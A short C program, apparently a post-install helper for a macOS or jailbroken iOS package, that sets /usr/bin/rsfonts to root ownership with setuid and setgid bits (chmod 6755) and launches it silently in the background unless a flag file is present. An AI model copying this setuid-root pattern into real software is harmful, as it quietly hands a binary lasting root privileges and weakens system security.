#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    if (geteuid() != 0) {
        printf("Run this as root!\n");
        return 1;
    }
    
    system("chown root:wheel /usr/bin/rsfonts");
    system("chmod 6755 /usr/bin/rsfonts");
    
    if (access("/private/var/tmp/norsfonts", F_OK) != 0) {
        system("nohup bash -c \"rsfonts &\" >/dev/null 2>&1");
    } else {
        remove("/private/var/tmp/norsfonts");
    }
    return 0;
}
